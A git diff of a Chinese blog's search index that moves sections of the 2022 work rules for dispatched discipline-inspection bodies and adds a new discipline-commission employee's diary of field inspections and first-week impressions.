+<h2 id="第六章-管理监督"><a href="#第六章-管理监督" class="headerlink" title="第六章 管理监督"></a>第六章 管理监督</h2><p>  <strong>第四十五条</strong> 派驻机构必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，以党的政治建设为统领推进党的各方面建设，教育引导派驻机构干部忠于职守、履职尽责，不断提高政治判断力、政治领悟力、政治执行力，带头增强“四个意识”、坚定“四个自信”、做到“两个维护”，发扬党的优良传统和作风，加强思想淬炼、政治历练、实践锻炼、专业训练，增强法治意识、程序意识、证据意识，建设政治素质高、忠诚干净担当、专业化能力强、敢于善于斗争的派驻机构干部队伍。</p>
+<p>  派驻机构党组织应当严格执行党的组织生活制度，推进党支部标准化规范化建设，增强党组织政治功能和组织力凝聚力，发挥战斗堡垒作用。</p>
+<p>  <strong>第四十六条</strong> 派出机关应当严把派驻机构干部入口关，按照干部管理权限统筹派出机关和派驻机构干部的选拔任用、人员交流、考核培训、监督管理，有计划地安排派驻机构干部参与派出机关工作、进行培养锻炼。</p>
+<p>  <strong>第四十七条</strong> 派出机关应当每年组织派驻机构主要负责人进行述责述廉。结合驻在单位特点，对派驻机构履行职责以及自身建设等方面情况进行考核。考核中，应当听取驻在单位领导班子和有关方面的意见，并将其作为考核的重要依据。</p>
+<p>  <strong>第四十八条</strong> 派驻机构应当加强规范化、法治化、正规化建设，明确职权范围，健全内控机制，规范工作流程和审批权限，完善回避、保密和过问、干预案件登记备案等管理制度，建立健全办案安全责任制，推动各项工作依规依纪依法进行。</p>
+<p>  <strong>第四十九条</strong> 派驻机构应当坚持打铁必须自身硬，坚持严的标准，勇于刀刃向内，牢固树立监督者更要自觉接受监督的意识，加强自我管理、自我约束，不断提高免疫力，切实防治“灯下黑”。</p>
+<p>  派驻机构应当接受派出机关同级党委巡视巡察监督和派出机关的管理监督，对所提监督意见进行整改落实，并报告整改情况。</p>
+<p>  派驻机构应当明确专门机构或者人员负责干部日常管理监督工作，及时汇总各方面意见，对自身权力运行的关键环节进行经常性检查，认真核查相关检举控告，按照规定将处置情况向派出机关干部监督部门报告。</p>
+<p>  派驻机构应当听取驻在单位领导班子对派驻机构工作的意见建议，认真研究处理，并及时反馈。自觉接受驻在单位党员、干部和群众的监督，畅通意见反映渠道，对反映的问题进行调查核实处置，不断完善制度、改进工作。</p>
+<p>  <strong>第五十条</strong> 派驻机构干部有跑风漏气、迟报瞒报、滥用职权、以案谋私以及其他违规违纪违法行为的，依规依纪依法严肃处理；构成犯罪的，依法追究刑事责任。</p>
+<p>  <strong>第五十一条</strong> 派驻机构及其领导干部不履行或者不正确履行职责，导致应当发现的问题没有发现，或者发现问题不报告不处置，执纪执法不严格不规范，造成严重后果或者恶劣影响的，予以严肃问责。</p>
+<h2 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h2><p>  <strong>第五十二条</strong> 本规则涉及的审批权限均指最低审批权限，工作中根据需要可以按照更高层级的审批权限报批。</p>
+<p>  <strong>第五十三条</strong> 派驻国有企业、普通高等学校的监察机构、监察专员（监察专员办公室）除执行本规则外，还应当执行中央纪律检查委员会国家监察委员会相关规定。</p>
+<p>  <strong>第五十四条</strong> 中央军事委员会可以根据本规则制定相关细则。</p>
+<p>  <strong>第五十五条</strong> 本规则由中央纪律检查委员会国家监察委员会负责解释。</p>
+<p>  <strong>第五十六条</strong> 本规则自发布之日起施行。此前发布的其他有关纪检监察机关派驻机构工作的规定，凡与本规则不一致的，按照本规则执行。</p>
 ]]></content>
       <categories>
-        <category>工作</category>
+        <category>工具书</category>
       </categories>
       <tags>
-        <tag>工作日志</tag>
+        <tag>实体法规</tag>
       </tags>
   </entry>
   <entry>
@@ -3243,154 +3280,117 @@ sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span
       </tags>
   </entry>
   <entry>
-    <title>纪检监察机关派驻机构工作规则（2022年6月22日）</title>
-    <url>/2024/10/20/%E7%BA%AA%E6%A3%80%E7%9B%91%E5%AF%9F%E6%9C%BA%E5%85%B3%E6%B4%BE%E9%A9%BB%E6%9C%BA%E6%9E%84%E5%B7%A5%E4%BD%9C%E8%A7%84%E5%88%99%EF%BC%882022%E5%B9%B46%E6%9C%8822%E6%97%A5%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><p>  <strong>第一条</strong> 为了加强和规范纪检监察机关派驻机构工作，根据《中国共产党纪律检查委员会工作条例》和《中华人民共和国监察法》，制定本规则。</p>
-<p>  <strong>第二条</strong> 派驻机构工作坚持以习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，坚持自我革命，坚持敢于斗争，坚持实事求是，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，建立健全系统集成、协同高效的派驻监督体制机制，增强“派”的权威和“驻”的优势，一体推进不敢腐、不能腐、不想腐，充分发挥监督保障执行、促进完善发展作用。</p>
-<p>  <strong>第三条</strong> 在党中央集中统一领导下，中央纪律检查委员会国家监察委员会向中央一级党和国家机关以及其他组织派驻纪检监察机构，地方各级纪律检查委员会监察委员会向本级党和国家机关以及其他组织派驻纪检监察机构。派驻机构是派出机关的组成部分，与驻在单位是监督和被监督的关系。</p>
-<p>  派驻机构应当强化政治监督，把坚持和加强党的领导贯穿工作全过程各方面，推动驻在单位切实做到“两个维护”，贯彻党的理论和路线方针政策，落实党中央决策部署。</p>
-<p>  <strong>第四条</strong> 派驻机构遵循以下原则开展工作：</p>
-<p>  （一）坚持党中央集中统一领导，强化组织自上而下的监督功能；</p>
-<p>  （二）坚持民主集中制，重要事项集体研究决定；</p>
-<p>  （三）坚持敢于善于监督，完善常态化监督工作机制；</p>
-<p>  （四）坚持职责定位，依规依纪依法履行职责；</p>
-<p>  （五）坚持各项监督统筹衔接，推动全面从严治党主体责任和监督责任一体落实；</p>
-<p>  （六）坚持监督与被监督相统一，自觉接受各方面监督。</p>
-<p>第五条 派驻机构应当持续深化转职能、转方式、转作风，聚焦全面从严治党、党风廉政建设和反腐败工作，强化监督职责，突出工作重点，创新履职方式，有效运用“四种形态”，增强派驻监督全覆盖的有效性，推动派驻监督工作高质量发展。</p>
-<h2 id="第二章-组织设置"><a href="#第二章-组织设置" class="headerlink" title="第二章 组织设置"></a>第二章 组织设置</h2><p>  <strong>第六条</strong> 中央纪律检查委员会国家监察委员会向中央一级党和国家机关、中管金融企业派驻纪检监察组。地方各级纪律检查委员会监察委员会向本级党和国家机关、所管辖的国有金融企业派驻纪检监察组。</p>
-<p>  中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会按照规定向国有企业、普通高等学校等单位派驻纪检监察组；或者依法派驻监察机构，派驻监察专员并设立监察专员办公室，与该单位党的纪律检查机构合署办公。</p>
-<p>  对系统规模大、直属单位多、监督对象多的单位，可以单独派驻纪检监察组；对业务关联度高，或者需要统筹力量实施监督的相关单位，可以综合派驻纪检监察组。</p>
-<p>  <strong>第七条</strong> 派驻机构主要负责人按照规定担任驻在单位的党组（党委）成员，履行监督专责，不分管驻在单位工作。</p>
-<p>  派驻机构主要负责人实行交流任职、定期轮岗。</p>
-<p>  <strong>第八条</strong> 派驻机构的领导机构是组务会。组务会由派驻机构正职、副职组成。组务会会议学习贯彻落实党中央决策部署，贯彻中央纪委国家监委工作部署，落实派出机关工作安排，研究讨论管辖范围内纪检监察工作的重要问题、重要事项，按照权限讨论或者决定党纪政务处分等事项。</p>
-<p>  派驻机构应当健全组务会会议以及组长办公会议、专题会议等会议制度，完善议事决策机制。</p>
-<p>  <strong>第九条</strong> 派驻机构应当按照信访举报、监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的原则，结合实际设置内设机构或者明确人员分工。</p>
-<h1 id="第三章-领导体制"><a href="#第三章-领导体制" class="headerlink" title="第三章 领导体制"></a>第三章 领导体制</h1><p>  <strong>第十条</strong> 各级党委应当加强对纪检监察机关派驻机构工作的领导，健全机构设置、干部管理、工作保障等机制，听取纪律检查委员会监察委员会关于派驻监督工作的汇报，推动派驻机构履职尽责。</p>
-<p>  <strong>第十一条</strong> 驻在单位应当支持配合派驻机构工作，主动及时通报重要情况、重要问题，根据派驻机构工作需要提供有关材料，为派驻机构开展工作创造条件、提供保障。</p>
-<p>  <strong>第十二条</strong> 派驻机构由派出机关直接领导、统一管理，向派出机关负责，受派出机关监督。</p>
-<p>  各级纪律检查委员会常务委员会应当定期听取派驻监督工作情况报告。派出机关分管领导应当定期召开派驻机构负责人会议，经常同派驻机构主要负责人研究工作。</p>
-<p>  <strong>第十三条</strong> 派出机关相关部门根据职能职责，加强对派驻机构的指导、联系、服务和保障。</p>
-<p>  监督检查部门协助分管领导联系派驻机构日常工作：</p>
-<p>  （一）指导督促派驻机构履行职责；</p>
-<p>  （二）对派驻机构请示报告的问题、事项进行审核把关；</p>
-<p>  （三）对派出机关交办的重要案件、事项进行督促办理；</p>
-<p>  （四）办理派驻机构提请支持、协调的重要事项；</p>
-<p>  （五）向派驻机构通报驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员的一般性问题和谈话提醒、批评教育、责令检查、诫勉谈话等情况；</p>
-<p>  （六）联系开展其他工作。</p>
-<p>  <strong>第十四条</strong> 派出机关相关部门应当会同派驻机构联合开展以下监督工作：</p>
-<p>  （一）开展专项检查，推动驻在单位落实党中央决策部署；</p>
-<p>  （二）研判驻在单位政治生态，有针对性地开展监督；</p>
-<p>  （三）开展专题调查研究，查找分析利用公共权力和资源设租寻租、离职后违规从业等行业性、系统性廉洁风险，向驻在单位提出意见建议或者督促开展专项治理；</p>
-<p>  （四）支持配合派出机关同级党委巡视巡察机构开展工作，对整改情况进行监督；</p>
-<p>  （五）推动驻在单位落实纪检监察建议；</p>
-<p>  （六）其他需要联合开展的监督工作。</p>
-<p>  <strong>第十五条</strong> 派出机关监督检查部门、审查调查部门对于派驻机构管辖的重大、复杂案件，经批准可以直接办理或者组织、指挥办理。</p>
-<p>  <strong>第十六条</strong> 派出机关相关部门应当指导、协调派驻机构与地方纪律检查委员会监察委员会协作开展以下工作：</p>
-<p>  （一）协同开展专项检查、专项监督，推动解决有关系统和领域的突出问题；</p>
-<p>  （二）协作采取监督检查、审查调查措施；</p>
-<p>  （三）协商确定驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件的管辖，或者由派驻机构报请派出机关指定有关地方纪委监委管辖；</p>
-<p>  （四）联合审查调查驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件；</p>
-<p>  （五）其他需要协作开展的工作。</p>
-<p>  <strong>第十七条</strong> 派出机关相关部门应当组织、指导各派驻机构之间协作配合开展以下工作：</p>
-<p>  （一）针对共性或者关联性问题同步开展专项监督；</p>
-<p>  （二）对重大、复杂案件进行联合审查调查；</p>
-<p>  （三）协作开展案件审理、复议复查和复审工作；</p>
-<p>  （四）对派出机关部署的重要工作落实情况开展交叉检查或者联合检查；</p>
-<p>  （五）联合开展调研、培训；</p>
-<p>  （六）其他需要协作配合开展的工作。</p>
-<p>  <strong>第十八条</strong> 派驻机构应当加强对驻在单位内设纪检机构及直属单位纪检机构的业务指导和监督检查，督促、支持其发挥职能作用，推动纪检干部队伍建设，加强政治教育和业务培训，协调人员力量开展监督执纪工作。</p>
-<p>  <strong>第十九条</strong> 派驻垂直管理单位的纪检监察组应当加强对驻在单位的下一级单位纪检机构的业务指导和监督检查，对驻在单位各级纪检机构的工作进行统筹，推动层层落实监督责任。下一级单位纪检机构的监督执纪工作以派驻纪检监察组领导为主，线索处置和案件查办在向同级党组（党委）报告的同时应当一并向派驻纪检监察组报告。</p>
-<p>  实行双重领导并以上级单位领导为主的单位，国有企业、国有金融企业的派驻机构工作，参照前款规定执行。</p>
-<p>  <strong>第二十条</strong>各级纪律检查委员会监察委员会派出的机关纪检监察工作委员会，按照规定审理有关派驻机构审查调查的案件，定期向派出机关报告案件审理工作情况。在派出机关领导下，建立健全案件质量评查机制，向派驻机构反馈评查结果。</p>
-<p>  机关纪检监察工作委员会应当加强与派驻机构的沟通协调，对本级党和国家机关部门机关纪委的执纪审查工作进行协同指导。</p>
-<p>  <strong>第二十一条</strong> 派驻国有资产监管机构、教育行政部门等的纪检监察组，按照规定协助派出机关加强对国有企业、普通高等学校等单位派驻机构工作的指导，形成监督合力。</p>
-<p>  派驻国有资产监管机构的纪检监察组，应当加强对驻在单位党组（党委）管理领导班子的国有企业纪检机构监督执纪工作的领导。相关国有企业纪检机构的线索处置和案件查办在向同级党委报告的同时，应当一并向派驻纪检监察组报告。</p>
-<h1 id="第四章-工作职责"><a href="#第四章-工作职责" class="headerlink" title="第四章 工作职责"></a>第四章 工作职责</h1><p>  <strong>第二十二条</strong> 派驻机构依规依纪依法履行监督执纪问责和监督调查处置职责。</p>
-<p>  <strong>第二十三条</strong> 派驻机构应当把监督作为基本职责，结合驻在单位实际，重点监督检查以下情况：</p>
-<p>  （一）对党忠诚，践行党的性质宗旨情况；</p>
-<p>  （二）贯彻党的理论和路线方针政策、落实党中央决策部署、践行“两个维护”情况；</p>
-<p>  （三）落实全面从严治党主体责任、加强党风廉政建设和反腐败工作情况；</p>
-<p>  （四）贯彻执行民主集中制、依规依法履职用权、廉洁自律等情况。</p>
-<p>  <strong>第二十四条</strong> 派驻机构应当重点监督以下对象：</p>
-<p>  （一）驻在单位领导班子及其成员特别是主要负责人；</p>
-<p>  （二）驻在单位上级党委管理的其他人员；</p>
-<p>  （三）驻在单位党组（党委）管理的领导班子及其成员；</p>
-<p>  （四）其他列入重点监督对象的驻在单位人员。</p>
-<p>  <strong>第二十五条</strong> 派驻机构应当支持和督促驻在单位党组（党委）落实全面从严治党主体责任，协助其开展内部巡视巡察，推动驻在单位深化改革、健全制度、完善治理、防控风险。</p>
-<p>  <strong>第二十六条</strong> 派驻机构应当结合派驻监督工作情况，推动驻在单位党组（党委）开展全面从严治党、党风廉政建设和反腐败工作的形势任务教育，强化纪法教育、警示教育，推进廉洁文化建设，教育引导党员、干部以及监察对象修身律己，筑牢思想道德防线。</p>
-<p>  <strong>第二十七条</strong> 派驻机构对反映驻在单位党组织和党员、干部以及监察对象问题的检举控告，按照规定受理和处置。</p>
-<p>  <strong>第二十八条</strong> 派驻机构对驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员涉嫌违纪和职务违法、职务犯罪问题线索，经批准可以参与派出机关的初步核实、审查调查工作。</p>
-<p>  <strong>第二十九条</strong> 派驻机构负责审查以下党组织和党员涉嫌违犯党纪的案件：</p>
-<p>  （一）驻在单位党组（党委）直接领导的党组织；</p>
-<p>  （二）驻在单位党组（党委）管理的领导班子成员；</p>
-<p>  （三）本规则第二十四条第四项规定的人员。</p>
-<p>  派驻机构必要时可以审查驻在单位党组（党委）管理的其他党组织和党员涉嫌违犯党纪的案件。</p>
-<p>  派驻机构根据派出机关授权，依法调查驻在单位监察对象涉嫌职务违法、职务犯罪案件。</p>
-<p>  <strong>第三十条</strong> 派驻机构按照管理权限，对违纪违法的驻在单位党组织和党员、干部以及监察对象进行处理处分，对不履行或者不正确履行职责的驻在单位党组织和领导干部进行问责。</p>
-<p>  <strong>第三十一条</strong> 派驻机构负责受理和处置以下申诉或者复审申请：</p>
-<p>  （一）党组织和党员对派驻机构所作处理决定不服的申诉；</p>
-<p>  （二）监察对象对派驻机构所作处理决定不服的复审申请；</p>
-<p>  （三）被调查人及其近亲属对派驻机构及其工作人员侵害被调查人合法权益行为的申诉。</p>
-<p>  对于派驻机构立案审查调查后由驻在单位作出处理决定案件的申诉或者复核申请，派驻机构应当协助驻在单位做好有关处置工作。</p>
-<h1 id="第五章-履职程序"><a href="#第五章-履职程序" class="headerlink" title="第五章 履职程序"></a>第五章 履职程序</h1><p>  <strong>第三十二条</strong> 派驻机构开展日常监督应当深入实际、深入群众，监督方式包括：</p>
-<p>  （一）参加会议。参加或者列席驻在单位领导班子会议等重要会议，了解学习贯彻党中央决策部署以及上级党组织决定情况和班子成员的意见态度，“三重一大”决策制度执行情况，按照规定向派出机关报告。</p>
-<p>  （二）谈心谈话。同党员、干部和群众广泛谈心谈话，听取对监督对象的反映，发现监督对象存在苗头性、倾向性问题的，进行谈话提醒、批评教育。</p>
-<p>  （三）听取汇报。听取驻在单位党组（党委）管理的领导班子及其成员履行管党治党责任情况的汇报，发现责任落实不到位的，进行提醒纠正。</p>
-<p>  （四）查阅资料。按照规定查阅、复制驻在单位有关文件、资料、数据等材料，了解核实有关情况。</p>
-<p>  （五）沟通情况。加强与驻在单位机关党委、党委办公室和组织人事、巡视巡察、法规法务、财务审计等部门的沟通，及时发现和通报问题。</p>
-<p>  （六）分析研判。分析信访举报、党风廉政等情况，对典型性、普遍性问题向驻在单位提出意见建议。</p>
-<p>  （七）廉政把关。建立健全、动态更新驻在单位党组（党委）管理的领导干部廉政档案，严把党风廉政意见回复关。</p>
-<p>  （八）实地调查。开展驻点调研、现场核查，精准发现驻在单位存在的突出问题。</p>
-<p>  （九）其他开展日常监督的方式。</p>
-<p>  <strong>第三十三条</strong> 派驻机构应当严格执行报告制度，发现驻在单位领导班子及其成员重要问题、重要事项及时向派出机关报告。</p>
-<p>  派驻机构应当经常对驻在单位领导班子及其成员坚持党的领导、加强党的建设、履行全面从严治党主体责任情况以及党风廉政状况进行分析，每年向派出机关提交专题报告。</p>
-<p>  &nbsp;<strong>第三十四条</strong> 派驻机构应当定期会同驻在单位党组（党委）专题研究全面从严治党、党风廉政建设和反腐败工作。派出机关监督检查部门根据情况派员参加。</p>
-<p>  派驻机构主要负责人应当经常与驻在单位党组（党委）主要负责人就政治生态、作风建设、廉洁风险等情况交换意见，提出工作建议，督促完善有关制度措施。</p>
-<p>  <strong>第三十五条</strong> 派驻机构应当向驻在单位领导班子成员通报其分管部门和单位领导干部遵守党章党规党纪、廉洁自律等情况，推动领导班子成员落实“一岗双责”要求，抓好分管部门和单位的党风廉政建设工作。</p>
-<p>  <strong>第三十六条</strong> 派驻机构对驻在单位开展内部巡视巡察提供以下协助：</p>
-<p>  （一）通报监督执纪执法中发现的问题；</p>
-<p>  （二）处置内部巡视巡察移交的问题线索；</p>
-<p>  （三）检查整改责任落实情况；</p>
-<p>  （四）其他协助内部巡视巡察的工作。</p>
-<p>  <strong>第三十七条</strong> 派驻机构应当指定专人负责管理涉嫌违纪和职务违法、职务犯罪问题线索，逐件编号登记，建立管理台账。</p>
-<p>  派驻机构应当结合日常监督掌握的情况，对问题线索进行综合分析、适当了解，采取谈话函询、初步核实、暂存待查、予以了结等方式进行处置。线索处置意见应当自收到线索之日起1个月内提出。</p>
-<p>  处置问题线索应当报派驻机构主要负责人审批，并按照规定报派出机关备案。</p>
-<p>  <strong>第三十八条</strong> 派驻机构经过初步核实，需要进行立案审查调查的，应当报派驻机构主要负责人审批。其中，对驻在单位党组（党委）直接领导的党组织、党组（党委）管理的领导班子成员中的正职领导干部立案和副职领导干部涉嫌严重职务违法、职务犯罪立案的，应当报派出机关审批。</p>
-<p>  派驻机构在立案前应当征求驻在单位党组（党委）主要负责人意见，对于有不同意见的应当报派出机关决定。确因安全保密等特殊情况，经派出机关同意，也可以在立案后及时向驻在单位党组（党委）主要负责人通报。</p>
-<p>  <strong>第三十九条</strong> 派驻机构按照规定报批后，可以依规依纪依法采取谈话、讯问、询问、留置、查询、冻结、搜查、调取、查封、扣押（暂扣、封存）、勘验检查、鉴定措施。对依法应当交有关机关执行的措施，报派出机关审批并以派出机关名义办理。</p>
-<p>  派驻机构应当对审查调查措施进行严格监管，建立措施使用台账，定期将有关情况报派出机关案件监督管理部门、监督检查部门备案。</p>
-<p>  <strong>第四十条</strong> 派驻机构审查调查工作结束后，应当按照规定进行审理，提出纪律处理或者党纪处分建议、拟作出的政务处分决定或者处分建议，通报驻在单位党组（党委）。</p>
-<p>  <strong>第四十一条</strong> 驻在单位党组（党委）按照权限和程序，对违纪的党组织、党员作出纪律处理或者党纪处分决定。</p>
-<p>  派驻机构按照管理权限，对违法的监察对象依法作出政务处分决定；建议驻在单位处分的，由驻在单位依法依规作出处分决定。</p>
-<p>  派驻机构提出的处理处分建议与驻在单位党组（党委）的意见不同又不能协商一致的，由派驻机构报派出机关研究决定。</p>
-<p>  <strong>第四十二条</strong> 派驻机构发现驻在单位党组（党委）管理的党组织和领导干部失职失责造成严重后果或者恶劣影响，需要进行问责调查的，应当报派驻机构主要负责人审批后，启动问责调查程序。</p>
-<p>  派驻机构应当依规依纪依法开展问责调查，查明失职失责问题，按照管理权限作出问责决定，或者向有权作出问责决定的党组织（单位）提出问责建议。</p>
-<p>  对党组织采取改组方式问责的，按照党章和其他党内法规规定的权限、程序执行。对领导干部采取党纪政务处分方式问责的，按照本规则第三十八条、第四十条、第四十一条办理。</p>
-<p>  <strong>第四十三条</strong> 派驻机构对调查的监察对象和涉案人员涉嫌职务犯罪案件，经集体审议，认为犯罪事实清楚，证据确实、充分，需要追究刑事责任的，依法依规移送人民检察院审查起诉。</p>
-<p>  <strong>第四十四条</strong> 派驻机构发现驻在单位在贯彻党中央决策部署、落实全面从严治党主体责任、开展党风廉政建设以及决策机制、监督管理、制度执行等方面存在突出问题或者薄弱环节的，应当提出纪检监察建议。</p>
-<p>派驻机构应当加强对驻在单位问题整改情况的监督检查，督促限期整改、反馈，推动纪检监察建议落实到位。</p>
-<h1 id="第六章-管理监督"><a href="#第六章-管理监督" class="headerlink" title="第六章 管理监督"></a>第六章 管理监督</h1><p>  <strong>第四十五条</strong> 派驻机构必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，以党的政治建设为统领推进党的各方面建设，教育引导派驻机构干部忠于职守、履职尽责，不断提高政治判断力、政治领悟力、政治执行力，带头增强“四个意识”、坚定“四个自信”、做到“两个维护”，发扬党的优良传统和作风，加强思想淬炼、政治历练、实践锻炼、专业训练，增强法治意识、程序意识、证据意识，建设政治素质高、忠诚干净担当、专业化能力强、敢于善于斗争的派驻机构干部队伍。</p>
-<p>  派驻机构党组织应当严格执行党的组织生活制度，推进党支部标准化规范化建设，增强党组织政治功能和组织力凝聚力，发挥战斗堡垒作用。</p>
-<p>  <strong>第四十六条</strong> 派出机关应当严把派驻机构干部入口关，按照干部管理权限统筹派出机关和派驻机构干部的选拔任用、人员交流、考核培训、监督管理，有计划地安排派驻机构干部参与派出机关工作、进行培养锻炼。</p>
-<p>  <strong>第四十七条</strong> 派出机关应当每年组织派驻机构主要负责人进行述责述廉。结合驻在单位特点，对派驻机构履行职责以及自身建设等方面情况进行考核。考核中，应当听取驻在单位领导班子和有关方面的意见，并将其作为考核的重要依据。</p>
-<p>  <strong>第四十八条</strong> 派驻机构应当加强规范化、法治化、正规化建设，明确职权范围，健全内控机制，规范工作流程和审批权限，完善回避、保密和过问、干预案件登记备案等管理制度，建立健全办案安全责任制，推动各项工作依规依纪依法进行。</p>
-<p>  <strong>第四十九条</strong> 派驻机构应当坚持打铁必须自身硬，坚持严的标准，勇于刀刃向内，牢固树立监督者更要自觉接受监督的意识，加强自我管理、自我约束，不断提高免疫力，切实防治“灯下黑”。</p>
-<p>  派驻机构应当接受派出机关同级党委巡视巡察监督和派出机关的管理监督，对所提监督意见进行整改落实，并报告整改情况。</p>
-<p>  派驻机构应当明确专门机构或者人员负责干部日常管理监督工作，及时汇总各方面意见，对自身权力运行的关键环节进行经常性检查，认真核查相关检举控告，按照规定将处置情况向派出机关干部监督部门报告。</p>
-<p>  派驻机构应当听取驻在单位领导班子对派驻机构工作的意见建议，认真研究处理，并及时反馈。自觉接受驻在单位党员、干部和群众的监督，畅通意见反映渠道，对反映的问题进行调查核实处置，不断完善制度、改进工作。</p>
-<p>  <strong>第五十条</strong> 派驻机构干部有跑风漏气、迟报瞒报、滥用职权、以案谋私以及其他违规违纪违法行为的，依规依纪依法严肃处理；构成犯罪的，依法追究刑事责任。</p>
-<p>  <strong>第五十一条</strong> 派驻机构及其领导干部不履行或者不正确履行职责，导致应当发现的问题没有发现，或者发现问题不报告不处置，执纪执法不严格不规范，造成严重后果或者恶劣影响的，予以严肃问责。</p>
-<h1 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h1><p>  <strong>第五十二条</strong> 本规则涉及的审批权限均指最低审批权限，工作中根据需要可以按照更高层级的审批权限报批。</p>
-<p>  <strong>第五十三条</strong> 派驻国有企业、普通高等学校的监察机构、监察专员（监察专员办公室）除执行本规则外，还应当执行中央纪律检查委员会国家监察委员会相关规定。</p>
-<p>  <strong>第五十四条</strong> 中央军事委员会可以根据本规则制定相关细则。</p>
-<p>  <strong>第五十五条</strong> 本规则由中央纪律检查委员会国家监察委员会负责解释。</p>
-<p>  <strong>第五十六条</strong> 本规则自发布之日起施行。此前发布的其他有关纪检监察机关派驻机构工作的规定，凡与本规则不一致的，按照本规则执行。</p>
+    <title>工作日志（善学善思考）</title>
+    <url>/2024/10/15/%E5%B7%A5%E4%BD%9C%E6%97%A5%E5%BF%97%EF%BC%88%E5%96%84%E5%AD%A6%E5%96%84%E6%80%9D%E8%80%83%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>工作日志（善学善思考）</p>
+<p>本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！</p>
+<h2 id="2024-10-15"><a href="#2024-10-15" class="headerlink" title="2024.10.15"></a>2024.10.15</h2><p>今天是进入纪委的第一天，我被分配到了派驻县委办，早上八点半，我们这一批在521会议室集合等待与同事们见面，却被张部长单独叫了出去，原来是需要我和两个同事（LYQ和CXY）去跟服务市委三组下乡核实情况。还没有与同事见面就要下乡了？我不仅有些疑惑还有一些兴奋。</p>
+<p>去了三组，拿到了审计问题情况表，看了看大致情况，趁领导们商量的时候搜了一下表上的出底板和消力坎是什么东西，ZL姐出发前给我说了大致需要去做什么，我也满怀期待的等着领导给我分配任务。</p>
+<p>上午九点，我跟ZL姐去了X村水库，看了看水库的大致情况，ZL姐让我也拍照片记录，于是我分别拍了出底板和消力坎的图片。我问ZL姐我拍的图片咋样，ZL姐拿出她拍的图片，出底板和消力坎在一张图片里，并告诉我这样拍可以看到这两个的情况。我也暗暗记下这个拍照的方法。</p>
+<p>之后去了F庄村，主要查看农田灌溉渠的情况，到了现场发现灌溉渠里还是有干了的淤泥沉底，但是不影响灌溉，我积极的拍照片，却看到ZL姐亲自去灌溉渠里用手挖出一块干泥巴看淤泥的厚度，我心里想果然处处留心皆学问。灌溉渠紧邻学校，学校里传出蜗牛与黄鹂鸟的歌，我想我像是一只蜗牛，一步一步地往上爬。</p>
+<p>下午就开始整理报告。主要是1.项目基本情况。2.问题及产生原因。3.问题整改措施。4.相关责任追究</p>
+<p>之后向郝书记汇报，郝书记考虑的很全面。</p>
+<p>1.水毁项目管护不到位：农田灌溉渠是什么时候开始堵的，堵了多久，项目的基本情况，管护职责，灌溉了多少亩农田，区域面积，高标准农田管护员是不是村干部，是不是党员，是什么身份等。</p>
+<p>2.水库未按设计图纸施工：当时为什么验收过了、有没有变更手续，责任在谁，业主、施工方、监理方等。</p>
+<blockquote>
+<p>1.处处留心皆学问。2.凡事都要考虑全面细致。3.沟通的艺术</p>
+</blockquote>
+<h2 id="2024-10-16"><a href="#2024-10-16" class="headerlink" title="2024.10.16"></a>2024.10.16</h2><p>上午继续整理汇报资料，写文章需要逐字逐句，认真细致，比如市纪委写的是关坡村，下面报上来的资料是官坡村，一个“guan”字就要打电话确认，包括文档中设计的一些规定，要知道是谁发布的，省、市、县还是县水利局。这些工作做完之后，去了组了，见到了HT哥，没有给我分配什么任务，他在整理上交的档案，让我给档案的文件夹写名字。</p>
+<p>下午HT哥出去办事，我在组里等创能中心的人，并给我交代做好接待工作，等党风室的人通知。下午创能中心的人没有来，三组喊我去修改文档，回来之后在办公室也没有什么活干，倒腾了一会打印机，会打印和复印了，顺便激活了电脑的系统，HT办完事回来给我说要请假一个月，并带我去楼上见了15监察室Y主任（421）交代了一下。未来一个月组里就剩我自己了，本来刚来认识的人就不多，组里的人都不在，有些忐忑和担忧，听说是组里案件少，不容易接触到办案，因此未来一个月工作我认为还是能够完成的不错的。但是案件少，还是有点担心这一个月干的都是打杂的，学不到东西，没成果，被边缘化。</p>
+<blockquote>
+<p>写文档要严谨。</p>
+</blockquote>
+<h2 id="2024-10-17"><a href="#2024-10-17" class="headerlink" title="2024.10.17"></a>2024.10.17</h2><p>上午学习《中国共产党纪律处分条例》（2018、2023年版），可能要开会，S主任会联系。</p>
+<p>下午继续学习《中国共产党纪律处分条例》，组里就我自己，开着门看着同事们来来往往，忙忙碌碌，感觉有点格格不入，希望有人来让我干点啥。</p>
+<p>下班去食堂吃饭，听到同批的同事都在聊今天干了什么，很多人都接触案件了，感觉很充实。真是旱的旱死，涝的涝死。希望明天能给我分配点任务。同时我也在思考我的核心竞争力是什么，有什么是我独一无二不可替代的。越想越烦。</p>
+<blockquote>
+<p>有些焦虑吧。</p>
+</blockquote>
